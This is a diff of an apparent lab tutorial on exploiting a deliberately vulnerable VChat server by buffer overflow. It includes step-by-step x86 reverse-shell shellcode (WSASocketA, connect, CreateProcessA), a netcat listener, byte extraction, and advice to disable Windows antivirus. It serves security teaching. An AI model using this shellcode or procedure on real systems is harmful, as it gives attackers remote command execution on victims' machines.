@@ -1,42 +1,59 @@
  # VChat GTER Exploit: Reusing Code
-
-*Notice*: The following exploit and its procedures are based on the original [Blog](https://fluidattacks.com/blog/vulnserver-gter-no-egghunter/).
+> [!NOTE]
+> - The following exploit and its procedures are based on an original [Blog](https://fluidattacks.com/blog/vulnserver-gter-no-egghunter/) from fluid attacks.
+> - Disable Windows *Real-time protection* at *Virus & threat protection* -> *Virus & threat protection settings*.
+> - Don't copy the *$* sign when copying and pasting a command in this tutorial.
 ___
-As with the [previous exploit](https://github.com/DaintyJet/VChat_GTER_EggHunter), the GTER buffer has limited space. This means we have to be creative when we are performing any kind of buffer overflow to gain remote code execution (often leading to a shell). This exploit focuses on the reuse of code that is already present and loaded on the target machine. We will write shellcode (assembly) to execute useful gadgets of Windows C Standard Library code that has already been loaded in memory in order to allocate a new Windows Shell and create a remote connection to the attacker's machine, turning this into a reverse shell that allows for arbitrary remote code execution.
+As with the [previous exploit](https://github.com/DaintyJet/VChat_GTER_EggHunter), the GTER buffer has limited space. This means we have to be creative when we are performing any kind of buffer overflow to gain remote code execution (often leading to a shell). This exploit focuses on the reuse of code that is already present and loaded on the target machine. We will write shellcode (assembly) to execute useful gadgets of Windows C Standard Library code that has already been loaded in memory in order to allocate a new Windows shell and create a remote connection to the attacker's machine, turning this into a reverse shell that allows for arbitrary remote code execution. We do this we can limit the total amount to space required to generate a shell since our custom shellcode will not have to locate or load any libraries.
 
+> [!IMPORTANT]
+> Please set up the Windows and Linux systems as described in [SystemSetup](./SystemSetup/README.md)!
+## VChat Setup and Configuration
+This section covers the compilation process, and use of the VChat Server. We include instructions for both the original VChat code which was compiled with MinGW and GCC on Windows, and the newly modified code that can be compiled with the Visual Studio C++ compiler.
 
-## Exploitation
-The following sections cover the process that should (Or may) be followed when performing this exploitation on the VChat application. It should be noted that the [**Dynamic Analysis**](#dynamic-analysis) section makes certain assumptions primarily that we have access to the binary that may not be realistic; however, the enumeration and exploitation of generic Windows and Linux servers in order to procure this falls out of the scope of this document. 
+### Visual Studio
+1. Open the [Visual Studio project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/DLL/Essfun) for the *essfunc* DLL.
+2. Build the project, as this contains inline assembly the target DLL file must be compiled as a x86 DLL (32-bits).
+3. Copy the Resulting DLL from the *Debug* folder in the [Essfunc Project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/DLL/Essfun/Debug) into the *Debug* folder in the [VChat Project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/EXE/VChat/Debug)
 
-**Notice**: Please set up the Windows and Linux systems as described in [SystemSetup](../SystemSetup/README.md)!
+	<img src="Images/VS-Comp.png">
 
-### PreExploitation
-1. **Windows**: Setup VChat
-   1. Compile VChat and its dependencies if they have not already been compiled. This is done with mingw.
-      1. Create the essfunc object File.
-		```powershell
-		# Compile Essfunc Object file 
-		$ gcc.exe -c essfunc.c
-		```
-      2. Create the [DLL](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) containing functions that will be used by the VChat.   
-		```powershell
-		# Create a DLL with a static (preferred) base address of 0x62500000
-		$ gcc.exe -shared -o essfunc.dll -Wl,--out-implib=libessfunc.a -Wl,--image-base=0x62500000 essfunc.o
-		```
-         * ```-shared -o essfunc.dll```: We create a DLL "essfunc.dll", these are equivalent to the [shared library](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html) in Linux. 
-         * ```-Wl,--out-implib=libessfunc.a```: We tell the linker to generate generate a import library "libessfunc".a" [2].
-         * ```-Wl,--image-base=0x62500000```: We specify the [Base Address](https://learn.microsoft.com/en-us/cpp/build/reference/base-base-address?view=msvc-170) as ```0x62500000``` [3].
-         * ```essfunc.o```: We build the DLL based off of the object file "essfunc.o"
-      3. Compile the VChat application.
-		```powershell
-		# Compile and Link VChat
-		$ gcc.exe vchat.c -o vchat.exe -lws2_32 ./libessfunc.a
-		```
-         * ```vchat.c```: The source file is "vchat.c"
-         * ```-o vchat.exe```: The output file will be the executable "vchat.exe"
-         * ```-lws2_32 ./libessfunc.a```: Link the executable against the import library "libessfunc.a", enabling it to use the DLL "essfunc.dll"
-   2. Launch the VChat application. 
-		* Click on the Icon in File Explorer when it is in the same directory as the essfunc dll
+4. Open the [Visual Studio project](https://github.com/DaintyJet/vchat-fork/tree/main/Server/Visual%20Studio%20Projects/EXE/VChat) for the *VChat* EXE.
+5. Build the Project, our executable will be in the *Debug* folder. You can then launch the executable!
+### Mingw/GCC
+Compile VChat and its dependencies if they have not already been compiled. This is done with mingw.
+
+1. Create the essfunc object File.
+	```powershell
+	# Compile Essfunc Object file
+	$ gcc.exe -c essfunc.c
+	```
+2. Create the [DLL](https://learn.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library) containing functions that will be used by the VChat.
+	```powershell
+	# Create a DLL with a static (preferred) base address of 0x62500000
+	$ gcc.exe -shared -o essfunc.dll -Wl,--out-implib=libessfunc.a -Wl,--image-base=0x62500000 essfunc.o
+	```
+      * ```-shared -o essfunc.dll```: We create a DLL "essfunc.dll", these are equivalent to the [shared library](https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html) in Linux.
+      * ```-Wl,--out-implib=libessfunc.a```: We tell the linker to generate generate a import library "libessfunc".a" [2].
+      * ```-Wl,--image-base=0x62500000```: We specify the [Base Address](https://learn.microsoft.com/en-us/cpp/build/reference/base-base-address?view=msvc-170) as ```0x62500000``` [3].
+      * ```essfunc.o```: We build the DLL based off of the object file "essfunc.o"
+3. Compile the VChat application.
+	```powershell
+	# Compile and Link VChat
+	$ gcc.exe vchat.c -o vchat.exe -lws2_32 ./libessfunc.a
+	```
+      * ```vchat.c```: The source file is "vchat.c".
+      * ```-o vchat.exe```: The output file will be the executable "vchat.exe".
+      * ```-lws2_32 ./libessfunc.a```: Link the executable against the import library "libessfunc.a", enabling it to use the DLL "essfunc.dll".
+
+## Exploit Process
+The following sections cover the process that should (Or may) be followed when performing this exploitation on the VChat application. It should be noted that the [**Dynamic Analysis**](#dynamic-analysis) section makes certain assumptions such as having access to the application binary that may not be realistic in cases where you are exploiting remote servers; however, the enumeration and exploitation of generic Windows, and Linux servers to get the binary from a remote server falls outside of the scope of this document.
+
+### Information Collecting
+We want to understand the VChat program and how it works in order to effectively exploit it. Before diving into the specific of how VChat behaves the most important information for us is the IP address of the Windows VM that runs VChat and the port number that VChat runs on.
+
+1. Launch the VChat application.
+   * Click on the Icon in File Explorer when it is in the same directory as the essfunc dll
 2. **Linux**: Run NMap
 	```sh
 	# Replace the <IP> with the IP of the machine.
@@ -66,12 +83,12 @@ The following sections cover the process that should (Or may) be followed when p
 	![Telnet](Images/Telnet2.png)
 
 ### Writing Shell Code
-This section covers the process used when writing the initial shellcode we will use to create a socket connection and bind it to the input/output of a Windows shell creating a reverse shell. 
-#### Windows API/System Calls 
-Operating systems do not expose the underlying systems and functionality directly to user space applications. The necessary functions of an operating system may be exposed through [systemcalls](https://learn.microsoft.com/en-us/cpp/c-runtime-library/system-calls?view=msvc-170#see-also), this is also done in [Linux/Unix](https://man7.org/linux/man-pages/man2/syscalls.2.html) systems. In either case when writing programs we often do not interface directly with the system calls, we use wrapper functions or an **API** implemented in one of a language's libraries. This means that if we are able to locate where in memory these library functions are loaded, we can inject the arguments necessary to make a call onto the stack and jump to the address of the API function *reusing* code that already exists in memory. We can chain these function calls together in order to gain the same effect as a much larger payload that would normally include the necessary instructions to perform the system calls in the shellcode. 
+This section covers the process used when writing the initial shellcode we will use to create a socket connection and bind it to the input/output of a Windows shell creating a reverse shell.
+#### Windows API/System Calls
+Operating systems do not expose the underlying systems and functionality directly to user space applications. The necessary functions required by most applications may be exposed through [systemcalls](https://learn.microsoft.com/en-us/cpp/c-runtime-library/system-calls?view=msvc-170#see-also), this is done all major operating systems including [Linux/Unix](https://man7.org/linux/man-pages/man2/syscalls.2.html) and Windows systems. In either case when writing programs we often do not interface directly with the system calls, we use wrapper functions or an **API** implemented in one of a language's libraries. This is done to simplify their use, loading the arguments into the correct registers before the system call is made and the transition to kernel space is preformed. This means that if we are able to locate where in memory these library functions are loaded, we can inject the necessary arguments onto the stack in order to make a call or jump to the address of the API function *reusing* code that already exists in memory. We can chain these function calls together in order to gain the same effect as a much larger payload that would normally include the necessary instructions to perform the system calls in the shellcode.
 
 
-The shellcode we could write, or in our case generate with `msfvenom`, often contains calls to a few notable *API* functions. 
+The shellcode we could write, or in our case generate with `msfvenom`, often contains calls to a few notable *API* functions. These are some of these are listed below.
 #### WSAStartup
 The [WSAStartup(...)](https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup) is a *Windows* function provided in the the `winsock.h` header file, which performs a call to the [LoadLibraryA](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya) function in order to load the Windows Socket module allowing for the use of Windows Socket APIs.
 
@@ -84,10 +101,10 @@ int WSAStartup(
 );
 ```
 * ```wVersionRequired```: According to the docs To Be Determined...
-* ```lpWSAData```: Pointer to the [WSADATA](https://learn.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata) structure which contains information used when loading the Windows Socket module. 
+* ```lpWSAData```: Pointer to the [WSADATA](https://learn.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata) structure which contains information used when loading the Windows Socket module.
 
 
-Luckily for us, since we are exploiting a Vulnerable By Design (VBD) *web* server it has most likely already called the `WSAStartup(...)` function and loaded the Windows Socket module into memory. This allows us to reduce the size of the shellcode to some degree. 
+Luckily for us, since we are exploiting a Vulnerable By Design (VBD) *web* server it has most likely already called the `WSAStartup(...)` function and loaded the Windows Socket module into memory. This allows us to reduce the size of the shellcode to some degree.
 
 
 
@@ -117,7 +134,7 @@ SOCKET WSAAPI WSASocketA(
 
 Now lets look at the Assembly generated by a call to `WSASocketA(...)`:
 ```
-xor ebx,ebx             ; Set EBX to NULL 
+xor ebx,ebx             ; Set EBX to NULL
 push ebx                ; Push 'dwFlags = NULL' parameter
 push ebx                ; Push 'g = NULL' parameter
 push ebx                ; Push 'lpProtocolInfo = NULL' parameter
@@ -136,11 +153,12 @@ mov ebx,0x71ab8b6a      ; Address of WSASocketA()
 call ebx                ; call WSASocketA()
 xchg eax,esi            ; Save the returned socket handle on ESI
 ```
-> We should note that the arguments are processed in reverse order, this is because the stack is a First In Last Out (FILO) data structure and for the arguments to appear in the expected order we must process them (place them onto the stack) in reverse order. 
+> [!IMPORTANT]
+> Arguments are processed in reverse order, this is because the stack is a First In Last Out (FILO) data structure and for the arguments to appear in the expected order we must process them (place them onto the stack) in reverse order.
 
-1) The first set of arguments passed to ```WSASocketA(...)``` are set to NULL, this is because we do not need any configurations provided by the `dwFlags`, `g`, or `lpProtocolInfo` arguments. We can zero out a register by xor'ing it with itself, we then push the value of the register (0 or NULL) onto the stack three times, one for each of the arguments. 
+1) The first set of arguments passed to ```WSASocketA(...)``` are set to NULL, this is because we do not need any configurations provided by the `dwFlags`, `g`, or `lpProtocolInfo` arguments. We can zero out a register by xor'ing it with itself, we then push the value of the register (0 or NULL) onto the stack three times, one for each of the arguments.
    ```
-   xor ebx,ebx             ; Set EBX to NULL 
+   xor ebx,ebx             ; Set EBX to NULL
    push ebx                ; Push 'dwFlags = NULL' parameter
    push ebx                ; Push 'g = NULL' parameter
    push ebx                ; Push 'lpProtocolInfo = NULL' parameter
@@ -170,7 +188,7 @@ xchg eax,esi            ; Save the returned socket handle on ESI
 #### connect
 Although the Windows [connect(...)](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect) and [WSAConnect(...)](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect) functions perform functionally the same tasks, their arguments and style of use are slightly different. The `connect(...)` function models the traditional Unix style of sockets, whereas the `WSAConnect(...)` is Microsoft's implementation of the socket interface. In this case we will use the Unix style API `connect(...)`.
 
-The `connect(...)` function is used by a process to [make a connection](https://learn.microsoft.com/en-us/windows/win32/winsock/connecting-to-a-socket) to a specified destination. 
+The `connect(...)` function is used by a process to [make a connection](https://learn.microsoft.com/en-us/windows/win32/winsock/connecting-to-a-socket) to a specified destination.
 
 ```c
 int WSAAPI connect(
@@ -251,8 +269,8 @@ call ebx                ; Call connect()
    mov ebx,esp             ; Move ESP into EBX now EBX holds the pointer to sockaddr structure (which is on the stack)
    ```
    * Depending on the IP we are sending, we can change the constant we use in the addition and subtraction to prevent any NULL bytes!
-   * For the `sockaddr` structure 
-2) Then we push the size of the `sockaddr` structure onto the stack (This is always 16 bytes for IPv4). 
+   * For the `sockaddr` structure
+2) Then we push the size of the `sockaddr` structure onto the stack (This is always 16 bytes for IPv4).
    ```
    push byte 0x16          ; Size of sockaddr: sa_family + sa_data = 16
    ```
@@ -260,11 +278,11 @@ call ebx                ; Call connect()
    ```
    push ebx                ; Push pointer ('name' parameter)
    ```
-4. The socket descriptor is then placed onto the stack, it is assumed the `WSASocketA(...)` assembly has been ran and it store the socket descriptor in the `esi` register. 
+4. The socket descriptor is then placed onto the stack, it is assumed the `WSASocketA(...)` assembly has been ran and it store the socket descriptor in the `esi` register.
    ```
    push esi                ; Push saved socket handler ('s' parameter)
    ```
-5) We then call the `connect(...)` function. 
+5) We then call the `connect(...)` function.
    ```
    mov ebx,0x71ab4a07      ; Address of connect() on WinXPSP3
    call ebx                ; Call connect()
@@ -274,7 +292,7 @@ call ebx                ; Call connect()
 
 
 #### CreateProcessA
-The [`CreateProcessA(...)`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) function is used in Windows to [fork](https://man7.org/linux/man-pages/man2/fork.2.html) the current process and [execute](https://linux.die.net/man/3/execv) a new process in the forked process's place. This is what we use to spawn a Windows command prompt or powershell window and a pipe to set it's file descriptors (stdin, stdout, and stderr) to read from, or write to the Socket we have created. 
+The [`CreateProcessA(...)`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) function is used in Windows to [fork](https://man7.org/linux/man-pages/man2/fork.2.html) the current process and [execute](https://linux.die.net/man/3/execv) a new process in the forked process's place. This is what we use to spawn a Windows command prompt or powershell window and a pipe to set it's file descriptors (stdin, stdout, and stderr) to read from, or write to the Socket we have created.
 
 The function signature of `CreateProcessA(...)` is shown below:
 ```c
@@ -293,15 +311,15 @@ BOOL CreateProcessA(
 ```
 * [`lpApplicationName`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa#:~:text=%5Bin%2C%20optional%5D%20lpApplicationName): This is the full path to the module or executable to be executed, if this is NULL the first whitespace delimitated token in `lpCommandLine` must be the executable's name.
 * [`lpCommandLine`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa#:~:text=%5Bin%2C%20out%2C%20optional%5D%20lpCommandLine): This is the command to be executed, if this is null it uses the `lpApplicationName` parameter as a argument.
-* [`lpProcessAttributes`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa#:~:text=%5Bin%2C%20optional%5D%20lpProcessAttributes): A pointer to the [SECURITY_ATTRIBUTES](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)) structure. This can be NULL. 
-* [`lpThreadAttributes`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa#:~:text=%5Bin%2C%20optional%5D%20lpThreadAttributes): A pointer to the [SECURITY_ATTRIBUTES](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)) structure. This can be NULL. 
-* [`bInheritHandles`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa#:~:text=%5Bin%5D%20bInheritHandles): If set to true all inheritable handles will be inherited by the child process. Otherwise, they will not be. 
+* [`lpProcessAttributes`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa#:~:text=%5Bin%2C%20optional%5D%20lpProcessAttributes): A pointer to the [SECURITY_ATTRIBUTES](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)) structure. This can be NULL.
+* [`lpThreadAttributes`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa#:~:text=%5Bin%2C%20optional%5D%20lpThreadAttributes): A pointer to the [SECURITY_ATTRIBUTES](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)) structure. This can be NULL.
+* [`bInheritHandles`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa#:~:text=%5Bin%5D%20bInheritHandles): If set to true all inheritable handles will be inherited by the child process. Otherwise, they will not be.
 * [`dwCreationFlags`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa#:~:text=%5Bin%5D%20dwCreationFlags): Used to configure Process creation attributes such as priority through the [process-creation-flags](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags).
 * [`lpEnvironment`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa#:~:text=%5Bin%2C%20optional%5D%20lpEnvironment): This is used to control the environment block of the spawned processes. If NULL it will inherit from the parent process.
 * [`lpCurrentDirectory`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa#:~:text=%5Bin%2C%20optional%5D%20lpCurrentDirectory): Full path to the directory the process should have as the Current Working Directory (CWD), if NULL it will share the CWD of the parent process.
 * [`lpStartupInfo`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa#:~:text=%5Bin%5D-,lpStartupInfo,-A%20pointer%20to): Pointer to [STARTUPINFOA](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa) structure.
 * [`lpProcessInformation`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa#:~:text=%5Bout%5D%20lpProcessInformation): Pointer to [PROCESS_INFORMATION](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information) structure. The function will write to the structure (pointer) we provide.
-  
+
 
 The [`_STARTUPINFOA`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa) structure will be used to make sure our process reads from and writes to the socket we have created. Its definition is shown below:
 ```c
@@ -330,8 +348,8 @@ typedef struct _STARTUPINFOA {
 * [`lpReserved`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa#:~:text=structure%2C%20in%20bytes.-,lpReserved,-Reserved%3B%20must%20be): Must be NULL (NULL).
 * [`lpDesktop`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa#:~:text=structure%2C%20in%20bytes.-,lpReserved,-Reserved%3B%20must%20be): Name of desktop or Windows station for this process (NULL).
 * [`lpTitle`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa#:~:text=a%20Desktop.-,lpTitle,-For%20console%20processes): Name to be displayed in title bar; if NULL this is the executable's file name is used (NULL).
-* [`dwX`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa#:~:text=new%20console%20window.-,dwX,-If%20dwFlags%20specifies): Start position x, if no GUI window is created this should be NULL. 
-* [`dwY`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa#:~:text=CreateWindow%20is%20CW_USEDEFAULT.-,dwY,-If%20dwFlags%20specifies): Start position y, if no GUI window is created this should be NULL. 
+* [`dwX`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa#:~:text=new%20console%20window.-,dwX,-If%20dwFlags%20specifies): Start position x, if no GUI window is created this should be NULL.
+* [`dwY`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa#:~:text=CreateWindow%20is%20CW_USEDEFAULT.-,dwY,-If%20dwFlags%20specifies): Start position y, if no GUI window is created this should be NULL.
 * [`dwXSize`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa#:~:text=CreateWindow%20is%20CW_USEDEFAULT.-,dwXSize,-If%20dwFlags%20specifies): Width of window, if no GUI window is created this is ignored (NULL).
 * [`dwYSize`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa#:~:text=CreateWindow%20is%20CW_USEDEFAULT.-,dwYSize,-If%20dwFlags%20specifies): Height of window, if no GUI window is created this is ignored (NULL).
 * [`dwXCountChars`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa#:~:text=CreateWindow%20is%20CW_USEDEFAULT.-,dwXCountChars,-If%20dwFlags%20specifies): Specifies the screen buffer width, if no GUI window is created this is ignored (NULL).
@@ -358,7 +376,9 @@ typedef struct _PROCESS_INFORMATION {
 * [`hProcess`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information#:~:text=Members-,hProcess,-A%20handle%20to): Handel to newly created process.
 * [`hThread`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information#:~:text=the%20process%20object.-,hThread,-A%20handle%20to): Handel to primary thread of the newly created process.
 * [`dwProcessId`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information#:~:text=the%20thread%20object.-,dwProcessId,-A%20value%20that): Process ID that uniquely identifies the process.
-* [`dwThreadId`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information#:~:text=may%20be%20reused.-,dwThreadId,-A%20value%20that): Thread ID, used to uniquely identify a thread. Once a thread exits the ID may be reused.  
+* [`dwThreadId`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information#:~:text=may%20be%20reused.-,dwThreadId,-A%20value%20that): Thread ID, used to uniquely identify a thread. Once a thread exits the ID may be reused.
+
+> [!NOTE]
 > Since this structure is only used to contain information returned by the `CreateProcessA(...)` call, we can have all values set to NULL when we create it on the stack.
 
 
@@ -492,7 +512,7 @@ call ebx                ; Call CreateProcessA()
  
 
 #### Arwin 
-This section will show you how we can get the address of a function using [arwin](https://github.com/xinwenfu/arwin). It is unlikely you will have access to the target computer to run the [arwin](https://github.com/xinwenfu/arwin) program in most scenarios, and in those cases you would need to add to the shell code a section that calls [`getProcAddress(...)`](https://marcosvalle.github.io/re/exploit/2018/10/21/windows-manual-shellcode-part2.html#:~:text=Get%20WSASocketA%20with-,GetProcAddress,-This%20step%20is).
+This section will show you how we can get the address of a function using [arwin](https://github.com/xinwenfu/arwin). It is unlikely you will have access to the target computer to run the [arwin](https://github.com/xinwenfu/arwin) program in most scenarios, and in those cases you would need to add to the shell code a section that calls [`getProcAddress(...)`](https://marcosvalle.github.io/re/exploit/2018/10/21/windows-manual-shellcode-part2.html#:~:text=Get%20WSASocketA%20with-,GetProcAddress,-This%20step%20is). You could alternatively attempt to leak the PLT of the windows process.
 
 1) Open your Windows Virtual Machine.
 
@@ -506,26 +526,26 @@ This section will show you how we can get the address of a function using [arwin
 
 	<img src="Images/I3.png" width=800>
 
-	* If this is not installed you will need to download arwin, and add it to your path (Or simply run it from the downloaded folder). 
+	* If this is not installed you will need to download arwin, and add it to your path (Or simply run it from the downloaded folder).
 
 4)  Find the `WSASockA(...)` Function: Run `arwin ws2_32 WSASocketA`, example output is shown below.
-	* `arwin`: The arwin binary
-	* `ws2_32`: Look for Windows socket 2, 32-bit related functions
-	* `WSASocketA`: Look for the WSASocketA function
+	* `arwin`: The arwin binary.
+	* `ws2_32`: Look for Windows socket 2, 32-bit related functions.
+	* `WSASocketA`: Look for the WSASocketA function.
 
 	<img src="Images/I4.png" width=800>
 
 5) Find the `connect(...)` Function: Run `arwin ws2_32 connect`, example output is shown below.
-	* `arwin`: The arwin binary
-	* `ws2_32`: Look for Windows socket 2, 32-bit related functions
-	* `connect`: Look for the connect function
+	* `arwin`: The arwin binary.
+	* `ws2_32`: Look for Windows socket 2, 32-bit related functions.
+	* `connect`: Look for the connect function.
 
 	<img src="Images/I5.png" width=800>
 
-6) Find the `CreateProcessA` Function: Run `arwin kernel32 CreateProcessA`, example output is shown below 
-	* `arwin`: The arwin binary
-	* `kernel32`: Look for kernel module, 32-bit related functions
-	* `CreateProcessA`: Look for the CreateProcessA function
+6) Find the `CreateProcessA` Function: Run `arwin kernel32 CreateProcessA`, example output is shown below:
+	* `arwin`: The arwin binary.
+	* `kernel32`: Look for kernel module, 32-bit related functions.
+	* `CreateProcessA`: Look for the CreateProcessA function.
 
 	<img src="Images/I6.png" width=800>
 
@@ -557,9 +577,9 @@ We now need to make the complete shellcode we will compile.
 
 4) Now we can extract the binary with a simple [shell script](./SourceCode/extract.sh).
 	```sh
-	for i in $(objdump -d shellcode.o -M intel | grep "^ " | cut -f2); do 
-		echo -n '\x'$i; 
-	done; 
+	for i in $(objdump -d shellcode.o -M intel | grep "^ " | cut -f2); do
+		echo -n '\x'$i;
+	done;
 	echo
 	```
 	* `for i in`: For each value `$i` generated by the following command.
@@ -573,11 +593,11 @@ We now need to make the complete shellcode we will compile.
 
 	<img src="Images/I10.png" width=800>
 
-5) Now we can copy this shellcode into our exploit, see [exploit0.py](./SourceCode/exploit1.py) for guidance. We have already discovered how to jump back to the start of our buffer in the [original GTER exploit](https://github.com/DaintyJet/VChat_GTER_EggHunter). So we need to perform a simple modification where we instead fill the start with our new shellcode. 
+5) Now we can copy this shellcode into our exploit, see [exploit0.py](./SourceCode/exploit1.py) for guidance. We have already discovered how to jump back to the start of our buffer in the [original GTER exploit](https://github.com/DaintyJet/VChat_GTER_EggHunter). So we need to perform a simple modification where we instead fill the start with our new shellcode.
 6) Start netcat listening on port 4444, Run: `nc -lvp 4444`
 	* `nc`: netcat command.
 	* `l`: Listen.
-	* `v`: Verbose output. 
+	* `v`: Verbose output.
 	* `p`: Port.
 
 	<img src="Images/I11.png" width=800>
@@ -607,15 +627,15 @@ We now need to make the complete shellcode we will compile.
 
 10) Generate the assembly we can use to modify our shellcode; We will be using the tool `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`
 	* Run the command `./usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`.
-	* Enter `push eax` and save the output. 
+	* Enter `push eax` and save the output.
 	* Enter `pop esp` and save the output.
 	* Exit with `Ctl+D`.
 
 	<img src="Images/I17.png" width=800>
-	
-11) Modify the shellcode as shown in [exploit2.py](./SourceCode/exploit2.py), notice that we added the hex for the push and pop instructions in order to move the stack pointer out of the way, and we decreased the number of `A`'s by two as each instruction we added is one byte. 
+
+11) Modify the shellcode as shown in [exploit2.py](./SourceCode/exploit2.py), notice that we added the hex for the push and pop instructions in order to move the stack pointer out of the way, and we decreased the number of `A`'s by two as each instruction we added is one byte.
 	* *Note*: From the previous exploits it was possible to have the jump be a little imprecise, that is we could execute a few extra instructions without affecting the shellcode's execution. In this case you want to be sure that the jump preformed lands on the `push eax` instruction!
-12) Run the program once more
+12) Run the program once more.
 	* Now we can see the shell has been created!
 
 	<img src="Images/I18.png" width=800>
